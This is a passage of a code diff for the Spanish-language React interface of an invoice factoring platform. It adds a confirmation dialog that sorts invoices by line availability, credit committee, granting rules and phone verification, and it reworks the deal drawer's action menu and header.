         <span className="t10 uppercase tracking-wide" style={{ color: C.faint }}>Resultado por factura</span>
@@ -4667,7 +5189,7 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
       <div className="mt-1">
         {vistos.map((x) => {
           const f = x.f, v = x.v, isOpen = !!open[f.id]; const chip = DEUDOR_CHIP[v.tipo] || DEUDOR_CHIP["Otro"]; const tel = telEstadoDe(x);
-          const estPill = v.est === "ok" ? { bg: "#F0FDF4", fg: "#16A34A", t: "✓ Verificada" } : v.hard ? { bg: "#fef2f2", fg: "#DC2626", t: "✕ Regla dura · verif. + excepción" } : { bg: "#FFF7ED", fg: "#C2410C", t: "⚠ Req. verif." };
+          const estPill = v.est === "ok" ? { bg: "#F0FDF4", fg: "#16A34A", t: "✓ Verificada" } : v.hard ? { bg: "#fef2f2", fg: "#EF4444", t: "✕ Regla dura · verif. + excepción" } : { bg: "#FFF7ED", fg: "#C2410C", t: "⚠ Req. verif." };
           return (
           <div key={f.id} style={{ borderBottom: `1px solid ${C.line}` }}>
             <div onClick={() => setOpen((o) => ({ ...o, [f.id]: !o[f.id] }))} className="flex items-center gap-2 py-1.5 t11" style={{ cursor: "pointer" }}>
@@ -4683,7 +5205,7 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
                 <div>
                   <div className="t9 font-bold uppercase tracking-wide mb-1.5" style={{ color: C.ink }}>Reglas de verificación · cliente-deudor (3M)</div>
                   {v.evals.map((e) => {
-                    const rc = e.st === "ok" ? { bg: "#F0FDF4", fg: "#16A34A", t: `✓ ${e.r.fmt(e.v)}` } : e.st === "no" ? { bg: "#fef2f2", fg: "#DC2626", t: `✕ ${e.r.fmt(e.v)} · umbral ${e.r.thr}` } : { bg: "#FAF9FB", fg: "#6B7280", t: "? sin información" };
+                    const rc = e.st === "ok" ? { bg: "#F0FDF4", fg: "#16A34A", t: `✓ ${e.r.fmt(e.v)}` } : e.st === "no" ? { bg: "#fef2f2", fg: "#EF4444", t: `✕ ${e.r.fmt(e.v)} · umbral ${e.r.thr}` } : { bg: "#FAF9FB", fg: "#6B7280", t: "? sin información" };
                     return (
                     <div key={e.r.id} className="mb-1.5 rounded-lg bg-white p-2" style={{ border: `1px solid ${C.line}` }}>
                       <div className="flex items-start justify-between gap-2">
@@ -4698,7 +5220,7 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
                 </div>
                 <div>
                   <div className="rounded-lg bg-white p-2.5 mb-2" style={{ border: `1px solid ${C.line}` }}>
-                    <div className="t10 font-bold" style={{ color: C.ink }}>{v.est === "ok" ? <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#F0FDF4", color: "#16A34A" }}>✓ Verificada</span> por el modelo</> : v.hard ? <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#fef2f2", color: "#DC2626" }}>✕ Regla dura fallida</span> no comprar</> : <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#FFF7ED", color: "#C2410C" }}>⚠ Req. verif.</span> verificación telefónica</>}</div>
+                    <div className="t10 font-bold" style={{ color: C.ink }}>{v.est === "ok" ? <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#F0FDF4", color: "#16A34A" }}>✓ Verificada</span> por el modelo</> : v.hard ? <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#fef2f2", color: "#EF4444" }}>✕ Regla dura fallida</span> no comprar</> : <><span className="rounded-full px-1.5 py-0.5 t9" style={{ backgroundColor: "#FFF7ED", color: "#C2410C" }}>⚠ Req. verif.</span> verificación telefónica</>}</div>
                     <div className="mt-1 t9" style={{ color: C.sub }}>{v.est === "ok" ? "Todas las reglas dentro de umbral. Puede continuar a cesión y curse." : v.motivo}</div>
                     {v.exc && <div className="mt-1.5 rounded-md px-2 py-1 t9" style={{ backgroundColor: "#F1ECFF", border: "1px solid #F1ECFF", color: "#5B21D6" }}>🔒 Cursar requiere verificación completada + <b>{v.exc}</b></div>}
                   </div>
@@ -4723,7 +5245,148 @@ function VerificacionTab({ deal, facturasOp = [], bloqueado }) {
     </>
   );
 }
-function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorporarFacturas, onRetirarFactura, onPublicar, onCerrarOferta, onEnviarCierre, onContactar, onEditarContacto, onEnviarWA, onMover, cierre, onConfirmCierre, usuario, onAutorizarCausa, onOtorgarOperacion, tabInicial, onIrOtorgamientos, fullPage }) {
+// Confirmación del curse. Responde una sola pregunta: qué tiene que pasar para que esta operación
+// avance. Arriba, las dos cifras enfrentadas —lo que se cursa con línea vigente y lo que se le pide
+// al comité—, que dependen SÓLO de la asignación de línea. Abajo, los cuatro bloques de acciones.
+// Los bloques 2, 3 y 4 NO son disjuntos: una factura puede necesitar comité y además verificación.
+// Por eso los montos no suman la oferta y el pie lo dice explícitamente; si se presentaran como si
+// sumaran, alguien los va a restar mal.
+function ModalCurse({ deal, datos, onCancelar, onConfirmar, sinComentario }) {
+  useEffect(() => {
+    const h = (e) => { if (e.key === "Escape") onCancelar(); };
+    window.addEventListener("keydown", h);
+    return () => window.removeEventListener("keydown", h);
+  }, [onCancelar]);
+  if (!datos) return null;
+  const { evalLin, otorgRes, verifRes, validas } = datos;
+  const malosOtorg = new Set(otorgRes.deudores);
+  const idsVerif = new Set(verifRes.facturas.map((f) => f.id));
+  const estadoFac = new Map(evalLin.facturas.map((f) => [f.id, f.estado]));
+  const bloqueos = (f) => [estadoFac.get(f.id) === "REQUIERE_COMITE", malosOtorg.has(f.deudor), idsVerif.has(f.id)].filter(Boolean).length;
+  const limpias = validas.filter((f) => bloqueos(f) === 0 && estadoFac.get(f.id) === "CON_LINEA");
+  const conComite = validas.filter((f) => estadoFac.get(f.id) === "REQUIERE_COMITE");
+  const conOtorg = validas.filter((f) => malosOtorg.has(f.deudor));
+  const conVerif = validas.filter((f) => idsVerif.has(f.id));
+  const multi = validas.filter((f) => bloqueos(f) > 1);
+  const suma = (arr) => +arr.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1);
+  const nDeu = (arr) => new Set(arr.map((f) => f.deudor)).size;
+
+  const Bloque = ({ color, bg, bd, icono, titulo, resumen, children }) => (
+    <div className="rounded-xl p-2.5" style={{ backgroundColor: bg, border: `1px solid ${bd}` }}>
+      <div className="flex items-baseline justify-between gap-3">
+        <div className="t11 font-bold" style={{ color }}>{icono} {titulo}</div>
+        <div className="shrink-0 t10 font-semibold" style={{ color: C.sub }}>{resumen}</div>
+      </div>
+      {children}
+    </div>
+  );
+
+  return (
+    <>
+    <div className="fixed inset-0 z-50 flex items-center justify-center ovl p-6" onClick={onCancelar}>
+      <div onClick={(e) => e.stopPropagation()} className="w-full max-w-3xl rounded-2xl bg-white shadow-2xl" style={{ border: `1px solid ${C.line}`, maxHeight: "88vh", display: "flex", flexDirection: "column" }}>
+        <div className="rounded-t-2xl px-5 py-3.5" style={{ backgroundColor: C.lilac, borderBottom: `1px solid #DDD3FF` }}>
+          <div className="t15 font-bold" style={{ color: C.navy }}>Confirmar curse</div>
+          <div className="mt-0.5 t10" style={{ color: C.sub }}>
+            {evalLin.requiereComite > 0 ? "Esta operación necesita aprobación de riesgo antes de cursarse completa." : "Esta operación se cursa completa con la línea vigente."}
+          </div>
+        </div>
+
+        <div className="overflow-y-auto px-5 py-4" style={{ flex: 1 }}>
+          {/* Dos cifras enfrentadas. Dependen SÓLO de la línea: otorgamiento y verificación no bajan
+              el monto cursable, deciden cuándo se gira. */}
+          <div className="grid gap-3" style={{ gridTemplateColumns: "1fr 1fr" }}>
+            <div className="rounded-xl p-3" style={{ backgroundColor: "#F0FDF4", border: "1px solid #bbf7d0" }}>
+              <div className="t9 font-bold uppercase tracking-wide" style={{ color: "#16A34A" }}>Se cursa con línea vigente</div>
+              <div className="mt-1 text-2xl font-bold" style={{ color: "#16A34A" }}>{fmtMM(evalLin.cursable)}</div>
+              <div className="t10" style={{ color: C.sub }}>{evalLin.facturas.filter((f) => f.estado === "CON_LINEA").length} facturas</div>
+            </div>
+            <div className="rounded-xl p-3" style={{ backgroundColor: C.lilac, border: "1px solid #DDD3FF" }}>
+              <div className="t9 font-bold uppercase tracking-wide" style={{ color: "#7C3AED" }}>Se solicita al comité</div>
+              <div className="mt-1 text-2xl font-bold" style={{ color: "#7C3AED" }}>{fmtMM(evalLin.requiereComite)}</div>
+              <div className="t10" style={{ color: C.sub }}>{conComite.length} facturas · {evalLin.solicitudes.length} solicitud(es)</div>
+            </div>
+          </div>
+
+          <div className="mt-3 t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Qué tiene que pasar para que esta operación avance</div>
+          <div className="mt-1.5 grid gap-2">
+            <Bloque color="#16A34A" bg="#F0FDF4" bd="#bbf7d0" icono="✓" titulo="No requieren ninguna acción"
+              resumen={`${limpias.length} factura(s) · ${fmtMM(suma(limpias))}`}>
+              <div className="mt-0.5 t9" style={{ color: C.sub }}>Tienen línea asignada, otorgamiento aprobado y verificación resuelta. Se cursan hoy.</div>
+            </Bloque>
+
+            <Bloque color="#7C3AED" bg={C.lilac} bd="#DDD3FF" icono="◆" titulo="Necesitan comité de crédito"
+              resumen={`${conComite.length} factura(s) · ${nDeu(conComite)} deudor(es) · ${fmtMM(suma(conComite))}`}>
+              {evalLin.solicitudes.length > 0 && (
+                <div className="mt-1.5 overflow-x-auto">
+                  <div style={{ minWidth: 420 }}>
+                    {/* Sin columna «A quién afecta»: el nombre de la solicitud ya dice el nivel
+                        —puntual Cliente-Deudor vs. línea Deudor— y era una columna ancha repitiendo
+                        la misma información en prosa. El alcance queda en el tooltip. */}
+                    <div className="grid items-center gap-2 pb-1 t9 uppercase tracking-wide" style={{ gridTemplateColumns: "1.4fr 1.6fr 90px", color: "#8B7FB0", borderBottom: "1px solid #DDD3FF" }}>
+                      <span>Deudor</span><span>Qué se pide</span><span className="text-right">Monto</span>
+                    </div>
+                    {evalLin.solicitudes.map((s, i) => (
+                      <div key={i} className="grid items-center gap-2 py-1.5 t10" style={{ gridTemplateColumns: "1.4fr 1.6fr 90px", borderBottom: i < evalLin.solicitudes.length - 1 ? "1px solid #E9E2FF" : "none" }}>
+                        <span className="min-w-0"><span className="block truncate font-semibold" style={{ color: C.ink }} title={s.deudor}>{s.deudor}</span><span className="block t9" style={{ color: C.faint, fontVariantNumeric: "tabular-nums" }}>{s.rutDeudor}</span></span>
+                        <span style={{ color: C.sub, cursor: "help" }} title={`A quién afecta: ${s.alcance.toLowerCase()}.`}>{s.pide}</span>
+                        <span className="text-right font-semibold" style={{ color: "#7C3AED" }}>{fmtMM(s.monto)}</span>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+            </Bloque>
+
+            <Bloque color="#C2410C" bg="#FFF7ED" bd="#FED7AA" icono="▲" titulo="Necesitan acciones de otorgamiento"
+              resumen={`${otorgRes.ok}/${otorgRes.total} reglas · ${conOtorg.length} factura(s)`}>
+              <div className="mt-0.5 t9" style={{ color: C.sub }}>
+                {otorgRes.cliente || otorgRes.deudores.length
+                  ? <>Con observaciones: {otorgRes.cliente ? <b>el cliente</b> : null}{otorgRes.cliente && otorgRes.deudores.length ? " y " : ""}{otorgRes.deudores.length ? <b>{otorgRes.deudores.join(" · ")}</b> : null}.{sinComentario > 0 ? "" : <> Se resuelven en el tab <b>Otorgamiento</b>.</>}</>
+                  : "Todas las reglas del motor de otorgamiento están aprobadas."}
+              </div>
+              {/* Los antecedentes viven acá y no en una banda aparte: es la misma materia y el mismo
+                  destino, y separados repetían el tema a dos alturas del modal. */}
+              {sinComentario > 0 && (
+                <div className="mt-2 rounded-lg p-2.5" style={{ backgroundColor: "#fff", border: "1px solid #FED7AA" }}>
+                  <div className="t10 font-bold" style={{ color: "#C2410C" }}>Faltan {sinComentario} excepción(es) por justificar</div>
+                  <div className="mt-0.5 t9" style={{ color: C.sub, lineHeight: 1.45 }}>No se puede cursar hasta resolverlas. En el tab <b>Otorgamiento</b>, cada una necesita tu justificación —comentario o respaldo— o que marques <b>«No tengo comentarios adicionales»</b>.</div>
+                </div>
+              )}
+            </Bloque>
+
+            <Bloque color="#2563EB" bg="#EFF6FF" bd="#bfdbfe" icono="☎" titulo="Necesitan verificación de factura"
+              resumen={`${conVerif.length} factura(s) · ${verifRes.nDeudores} deudor(es) · ${fmtMM(suma(conVerif))}`}>
+              <div className="mt-0.5 t9" style={{ color: C.sub }}>
+                {conVerif.length ? "Requieren verificación telefónica con el deudor antes de girar. Se resuelven en el tab Verificación." : "Ninguna factura de la oferta requiere verificación telefónica."}
+              </div>
+            </Bloque>
+          </div>
+
+          {multi.length > 0 && (
+            <div className="mt-2 t9" style={{ color: C.faint }}>
+              Los tres bloques de acciones no son excluyentes: <b>{multi.length} factura(s)</b> aparecen en más de uno, así que sus montos no suman el total de la oferta.
+            </div>
+          )}
+          <div className="mt-2.5 rounded-lg p-2.5 t10" style={{ backgroundColor: "#F5F4F8", color: C.sub }}>
+            Al confirmar, las asignaciones de línea pasan de <b>reservadas</b> a <b>aprobadas</b>{evalLin.requiereComite > 0 ? <> y la solicitud queda en la bandeja del <b>comité de riesgo</b> como una sola solicitud con {evalLin.solicitudes.length} línea(s) de detalle, aprobable o recortable por separado</> : null}.
+          </div>
+        </div>
+
+        <div className="flex items-center justify-end gap-2 border-t px-5 py-3" style={{ borderColor: C.line }}>
+          <button onClick={onCancelar} className="rounded-full px-4 py-1.5 t11 font-semibold" style={{ border: `1px solid ${C.line}`, color: C.sub, backgroundColor: "#fff" }}>Cancelar</button>
+          {/* Sin las excepciones resueltas no se cursa: el apoderado no puede decidir sobre algo que
+              no le llegó justificado, así que la operación se quedaría detenida igual. */}
+          <button onClick={onConfirmar} disabled={sinComentario > 0}
+            title={sinComentario > 0 ? `Faltan ${sinComentario} excepción(es) por justificar en el tab Otorgamiento` : undefined}
+            className="rounded-full px-4 py-1.5 t11 font-semibold text-white disabled:opacity-40 disabled:cursor-not-allowed" style={{ backgroundColor: C.indigo }}>{evalLin.requiereComite > 0 ? "Confirmar y enviar" : "Confirmar curse"}</button>
+        </div>
+      </div>
+    </div>
+    </>
+  );
+}
+function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorporarFacturas, onRetirarFactura, onSugerirOferta, onSimular, onPublicar, onCerrarOferta, onEnviarCierre, onContactar, onEditarContacto, onEnviarWA, onMover, cierre, onConfirmCierre, usuario, onCambiarUsuario, onAutorizarCausa, onOtorgarOperacion, tabInicial, onIrOtorgamientos, fullPage }) {
   const [tab, setTab] = useState(tabInicial || (deal && deal.stage === "otorgamiento" ? "otorgamiento" : "negocio"));
   useEffect(() => { if (tabInicial) setTab(tabInicial); }, [tabInicial, deal && deal.id]);
   const [confirmRetiro, setConfirmRetiro] = useState(null); // factura a retirar de la oferta (ConfirmDialog spec §26)
@@ -4769,19 +5432,25 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
   const [openCall, setOpenCall] = useState(null); // transcripción de llamada expandida (Call Center)
   const [candPage, setCandPage] = useState(0); // paginador de facturas candidatas a agregar
   const [factTab, setFactTab] = useState("candidatas"); // sub-tab de facturas: candidatas | todas
-  const [negTab, setNegTab] = useState("resumen"); // sub-tab del negocio: resumen | documentos | detalle | descuentos
+  const [negTab, setNegTab] = useState("detalle"); // sub-tab del negocio: detalle | documentos | descuentos
   // Si el tenant apaga el sub-tab que estaba abierto, se vuelve a «Resumen», que siempre existe.
   // Sin esto la pantalla quedaría en blanco al cambiar la configuración con el detalle abierto.
   useEffect(() => {
-    const habilitado = { resumen: true, documentos: CFG_ACTIVA.tabDocumentos !== false, detalle: CFG_ACTIVA.tabDetalle !== false, descuentos: CFG_ACTIVA.tabDescuentos !== false };
-    if (!habilitado[negTab]) setNegTab("resumen");
+    const habilitado = { documentos: CFG_ACTIVA.tabDocumentos !== false, detalle: CFG_ACTIVA.tabDetalle !== false, descuentos: CFG_ACTIVA.tabDescuentos !== false };
+    if (!habilitado[negTab]) setNegTab(Object.keys(habilitado).find((k) => habilitado[k]) || "detalle");
   }, [negTab]);
   const [detOpen, setDetOpen] = useState({}); // acordeones del sub-tab Detalle (por deudor): abiertos por defecto; false = colapsado
   const [detQuery, setDetQuery] = useState(""); // buscador por empresa deudora (filtra ambas secciones del sub-tab Detalle)
   const [detOtrasPage, setDetOtrasPage] = useState(0); // paginador de «Otras facturas disponibles» (20 deudores por página)
+  const [otrasDeudor, setOtrasDeudor] = useState({}); // por deudor de la oferta: ver sus facturas NO seleccionadas
+  const [otrasAbierto, setOtrasAbierto] = useState(true); // «Otras facturas disponibles» colapsable: es el pool para agregar, no el contenido principal
   // Carga del sub-tab Detalle: su data (scoring, línea, otorgamiento y verificación por deudor) es de
   // APIs/BD. Al abrirlo o cambiar de oportunidad se muestra el esqueleto mientras "resuelve la query".
   const [detCargando, setDetCargando] = useState(false);
+  // Simulación disparada desde el selector de apertura. Calcular las condiciones es una llamada
+  // SÍNCRONA al motor de pricing (asignación de línea + tarifa), no un cambio de estado local: se
+  // demora, y la pantalla tiene que decirlo. Guarda la opción elegida para nombrarla en el loader.
+  const [simIni, setSimIni] = useState(null);
   useEffect(() => {
     if (negTab !== "detalle") return;
     setDetCargando(true);
@@ -4789,7 +5458,14 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
     return () => clearTimeout(t);
   }, [negTab, deal ? deal.id : null]);
   const [reevalPend, setReevalPend] = useState(false); // se agregaron/quitaron facturas → condiciones a re-evaluar
-  const [iaOpen, setIaOpen] = useState(false); // Resumen IA de la operación colapsable (colapsado por defecto para no ocupar viewport)
+  // Re-evaluación EXPLÍCITA de la línea (spec §8.4). Agregar o quitar facturas NO dispara el cálculo:
+  // cada clic sería una llamada a la API de líneas mientras el ejecutivo todavía está armando. Los
+  // montos aritméticos se actualizan al instante; las cifras que dependen de la línea muestran «Por
+  // evaluar» SIN número, porque una cifra vieja atenuada se sigue leyendo como cifra y alguien la va
+  // a citar.
+  const [detReeval, setDetReeval] = useState(false);
+  const reevaluarLinea = () => { setDetReeval(true); setTimeout(() => { setDetReeval(false); setReevalPend(false); }, 700); };
+  const [cursarModal, setCursarModal] = useState(null); // { evalLin, otorgRes, verifRes } — confirmación del curse
   const [pubMenu, setPubMenu] = useState(false); // dropdown de canal para publicar la oferta
   const [cierreMenu, setCierreMenu] = useState(false); // dropdown de canal para enviar el enlace de cierre
   const [pubModal, setPubModal] = useState(null); // { oferta, opts, canal, descartadas } — decisión sobre facturas descartadas recientes al publicar
@@ -4807,6 +5483,12 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
   const confirmarPub = () => { if (!pubModal) return; const n = pubModal.descartadas.length; onCerrarOferta(deal.id, { accion: pubAccion, espera: pubEspera, descartadas: n }); setPubModal(null); };
   const [retryMenu, setRetryMenu] = useState(false); // dropdown de canal para reintentar contacto
   const [rejectMenu, setRejectMenu] = useState(false); // dropdown de motivo de cierre (close_reason) al rechazar
+  const [accMenu, setAccMenu] = useState(false);       // menú único de acciones terminales de la operación
+  const [rechazoModal, setRechazoModal] = useState(false); // diálogo de motivo de cierre
+  const [accionSel, setAccionSel] = useState("cerrar"); // acción del split button; el menú la cambia
+  const [rechComp, setRechComp] = useState({ paso: false, quien: "", query: "", tasa: "" }); // 2º paso: contra quién se perdió y a qué tasa
+  const [primeMenu, setPrimeMenu] = useState(false);   // alta masiva de facturas de deudores Prime
+  const [xmlRes, setXmlRes] = useState(null);         // resultado de la última carga de XML (DTE): { ok, monto, rech:[] }
   const [preEvalWarn, setPreEvalWarn] = useState(null); // dialog de advertencia al pre-evaluar con excepciones sin comentario
   const [factQuery, setFactQuery] = useState(""); // buscador por folio o deudor en facturas
   const [subCanal, setSubCanal] = useState(() => (deal && deal.canalContacto === "Email") ? "Email" : "WhatsApp"); // canal activo en Contactabilidad (Call Center: más adelante)
@@ -4834,6 +5516,21 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
       return cliN + dN;
     } catch (e) { return 0; }
   })();
+  // Pendientes de otorgamiento de LA OPERACIÓN: el mismo conteo que la compuerta «Otorgamiento» del
+  // veredicto. `otorgPend` sólo cuenta lo que este usuario puede visar —para un ejecutivo eso es
+  // siempre 0, así que el badge no aparecía nunca en la pantalla donde más se necesita—, y quien mira
+  // el tab quiere saber cuánto falta, no quién firma. Se muestra sólo con la oferta SIMULADA: sin
+  // facturas seleccionadas las reglas de deudor no aplican y el número sería el del cliente solo,
+  // que se lee como si la operación ya trajera observaciones. Nunca por debajo de lo que este usuario
+  // debe visar, para no perder el aviso rojo que ya existía.
+  const otorgPendOp = (() => {
+    if (!deal.simulado) return otorgPend;
+    try {
+      const v = visadoDeal(deal);
+      const n = (v.excPend || []).length + (v.excRech || []).length + (v.rechFirme || []).length + (v.rechReev || []).length;
+      return Math.max(otorgPend, n);
+    } catch (e) { return otorgPend; }
+  })();
   const cont = deal.contacto || null;
   // Contacto validado: el cliente respondió por ese canal (WhatsApp/Call → teléfono; Email → correo).
   const telValidado = !!deal.telValidado || (deal.waSesion || []).some((m) => m.from === "cliente");
@@ -4845,7 +5542,7 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
   // completa va en el encabezado; en el panel lateral va al pie.
   const accionesBar = (
     <div className="flex items-center justify-end gap-2">
-      {otorgBloqueado(deal) && <div className="mr-auto flex items-center gap-1.5 rounded-md px-2.5 py-1.5 t11 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#DC2626" }}><X size={12} /> Rechazada por reglas de otorgamiento · sólo puede rechazarse</div>}
+      {otorgBloqueado(deal) && <div className="mr-auto flex items-center gap-1.5 rounded-md px-2.5 py-1.5 t11 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#EF4444" }}><X size={12} /> Rechazada por reglas de otorgamiento · sólo puede rechazarse</div>}
       <div className="relative">
         <button onClick={() => (otorgBloqueado(deal) ? onReject(deal.id) : setRejectMenu((v) => !v))} className="rounded-lg px-3 py-2 t12 font-medium" style={{ color: C.red, border: `1px solid ${C.line}` }}>Rechazar</button>
         {rejectMenu && !otorgBloqueado(deal) && (
@@ -4872,6 +5569,85 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
       </div>
     </div>
   );
+  // Menú único con las acciones terminales. Antes eran cinco controles sueltos en el encabezado
+  // —Rechazar, Guardar borrador, un select de etapa y Avanzar— compitiendo con el nombre del cliente.
+  // Ahora cuelgan del botón principal de la tarjeta de veredicto, que es donde el ejecutivo decide;
+  // el encabezado se queda sólo con Pre-evaluación. `extra` es la acción propia del sitio que lo abre
+  // (en la tarjeta, Cursar, que necesita la evaluación de línea que sólo existe allí).
+  // Acciones que puede llevar el botón principal. El menú las ofrece como elección (marca la
+  // vigente) y el botón ejecuta la que esté puesta.
+  const ACCIONES_PPAL = [
+    { k: "cerrar", label: "Cerrar oferta y publicar", color: "#16A34A" },
+    { k: "borrador", label: "Guardar borrador", color: C.ink },
+    { k: "rechazar", label: "Rechazar…", color: C.red },
+  ];
+  const labelAccion = (k) => (ACCIONES_PPAL.find((a) => a.k === k) || ACCIONES_PPAL[0]).label;
+  // `datosCurse` sólo existe en el sub-tab Detalle, que es donde se evalúa la línea. Con él, cerrar
+  // arranca por el resumen de comité/otorgamiento/verificación; sin él va directo al cierre.
+  const ejecutarAccion = (k, datosCurse) => {
+    if (k === "borrador") { onClose(); return; }
+    if (k === "rechazar") { setRechazoModal(true); return; }
+    if (deal.ofertaCerrada || deal.negocioNum) return;
+    if (datosCurse) setCursarModal(datosCurse); else intentarCerrar();
+  };
+  const panelAcciones = (seleccionable) => (
+    <div className="absolute right-0 z-40 mt-1 w-72 rounded-lg bg-white p-1 shadow-xl" style={{ border: `1px solid ${C.line}` }} onMouseLeave={() => setAccMenu(false)}>
+      {otorgBloqueado(deal) ? (
+        <>
+          <div className="m-1 flex items-start gap-1.5 rounded-md px-2 py-1.5 t9 font-semibold" style={{ backgroundColor: "#fef2f2", color: "#EF4444" }}><X size={11} className="mt-0.5 shrink-0" /><span>Rechazada por reglas de otorgamiento: sólo puede rechazarse.</span></div>
+          <button onClick={() => { setAccMenu(false); onReject(deal.id); }} className="flex w-full items-center gap-1.5 rounded-md px-2 py-1.5 t11 font-semibold text-left hover:bg-stone-50" style={{ color: C.red }}><X size={12} /> Rechazar la operación</button>
+        </>
+      ) : (
+        <>
+          <div className="px-2 py-1 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>{seleccionable ? "Acción del botón" : "Acciones"}</div>
+          {ACCIONES_PPAL.map((a) => {
+            const bloq = a.k === "cerrar" && !!(deal.ofertaCerrada || deal.negocioNum);
+            const puesta = seleccionable && accionSel === a.k;
+            return (
+              <button key={a.k} onClick={() => { setAccMenu(false); if (seleccionable) setAccionSel(a.k); else ejecutarAccion(a.k); }} disabled={bloq}
+                title={bloq ? "La oferta ya está cerrada" : undefined}
+                className="flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t11 text-left hover:bg-stone-50 disabled:opacity-40 disabled:cursor-not-allowed"
+                style={{ color: a.color, fontWeight: puesta ? 600 : 400 }}>
+                <span>{a.label}</span>{puesta && <Check size={13} style={{ color: C.indigo }} />}
+              </button>
+            );
+          })}
+          <div className="mx-2 my-1" style={{ borderTop: `1px solid ${C.line}` }} />
+          {(() => { const on = tienePrioridadCurse(deal.id); const puede = esJefeComercial(usuario); return (
+            <button onClick={puede ? () => { setPrioridadCurse(deal.id, usuario, !on); setReevTick((x) => x + 1); setAccMenu(false); } : undefined} disabled={!puede}
+              title={puede ? undefined : (on ? `Prioridad de curse solicitada por ${PRIORIDAD_CURSE[deal.id].porNombre}` : "La prioridad de curse la solicita una jefatura")}
+              className="flex w-full items-center gap-1.5 rounded-md px-2 py-1.5 t11 text-left hover:bg-stone-50 disabled:opacity-40 disabled:cursor-not-allowed" style={{ color: on ? "#C2410C" : C.ink }}>
+              <Star size={12} style={{ color: on ? "#C2410C" : C.faint, fill: on ? "#F97316" : "none" }} /> {on ? "Quitar prioridad de curse" : "Marcar prioridad de curse"}
+            </button>
+          ); })()}
+          {(() => {
+            // No se retrocede, y tres etapas no son avance manual: «Aceptada» la fija el cliente al
+            // firmar el cierre, «Cesión» la fija que las facturas queden cedidas, y a «Perdida» se
+            // llega por Rechazar, que exige motivo. «Girar» además pide que el cliente haya aceptado:
+            // sin aceptación no hay nada que desembolsar.
+            const iAct = STAGE_ORDER.indexOf(deal.stage);
+            const destinos = STAGES.filter((st) => {
+              if (["aceptadas", "cesion", "perdida"].includes(st.id)) return false;
+              if (STAGE_ORDER.indexOf(st.id) <= iAct) return false;
+              if (st.id === "giro") return aprobacionFormalCliente(deal);
+              return true;
+            });
+            if (!destinos.length) return null;
+            return (<>
+              <div className="mx-2 my-1" style={{ borderTop: `1px solid ${C.line}` }} />
+              <div className="px-2 py-1 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint }}>Avanzar a</div>
+              {destinos.map((st) => (
+                <button key={st.id} onClick={() => { setAccMenu(false); onMover(deal.id, st.id); }}
+                  className="flex w-full items-center justify-between gap-2 rounded-md px-2 py-1.5 t11 text-left hover:bg-stone-50" style={{ color: C.ink }}>
+                  <span>{st.id === "giro" ? "Girar (desembolsar)" : st.name}</span><ChevronRight size={12} style={{ color: C.faint }} />
+                </button>
+              ))}
+            </>);
+          })()}
+        </>
+      )}
+    </div>
+  );
   return (
     <>
       {!fullPage && <div className="fixed inset-0 z-40 ovl" style={{ cursor: "pointer" }} onClick={onClose} title="Cerrar (clic fuera del panel)" />}
@@ -4880,51 +5656,66 @@ function DealDrawer({ deal, onClose, onAdvance, onReject, onIncorporar, onIncorp
         {/* Sin borde propio: la divisoria es la de la fila de tabs, que es su último hijo. Con ambas se
             veían DOS líneas, separadas por el padding inferior del contenedor. */}
         <div className="p-5 pb-3" style={{ ...(fullPage ? { position: "sticky", top: 0, zIndex: 5, backgroundColor: "#fff" } : {}) }}>
-          {fullPage && (
-            <div className="-mx-5 -mt-5 mb-3 px-5 pt-3">
-              <div className="flex items-center gap-3">
-                <div className="flex flex-1 items-center gap-1">
-                  {progresoStages.map((s, i) => <div key={s.id} className="h-1.5 flex-1 rounded-full" style={{ backgroundColor: i <= stageIdx ? C.indigo : C.line }} />)}
-                </div>
-                <div className="t9 whitespace-nowrap" style={{ color: C.faint }}>Etapa {Math.min(stageIdx + 1, progresoStages.length)} de {progresoStages.length} — {stageLbl}</div>
+          {/* Encabezado en tres filas, cada una con su propio par izquierda/derecha: el stepper comparte
+              línea con el eyebrow y el selector de sesión baja a la altura del nombre del cliente, que
+              es con lo que se relaciona. Antes el stepper gastaba una fila entera para sí solo.
+              «Etapa N de M» deja de escribirse —la dice el propio stepper— y queda como tooltip. */}
+          <div className="flex items-center justify-between gap-3">
+            <div className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint, letterSpacing: ".08em" }}>Detalle de oportunidad</div>
+            {fullPage && (
+              <div className="flex shrink-0 items-center gap-1.5" title={`Etapa ${Math.min(stageIdx + 1, progresoStages.length)} de ${progresoStages.length} · ${STAGES[stageIdx].name}`}>
+                {progresoStages.map((s, i) => <div key={s.id} title={s.name} className="h-1.5 rounded-full" style={{ width: 34, backgroundColor: i <= stageIdx ? C.indigo : C.line }} />)}
               </div>
-            </div>
-          )}
-          <div className="flex items-start justify-between gap-3">
-            <div className="flex items-start gap-3">
-              <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg t13 font-bold" style={{ backgroundColor: C.lilac, color: C.indigo }}>{(deal.cliente || "?")[0]}</span>
-              <div>
-                <div className="t9 font-bold uppercase tracking-wide" style={{ color: C.faint }}>Detalle de oportunidad</div>
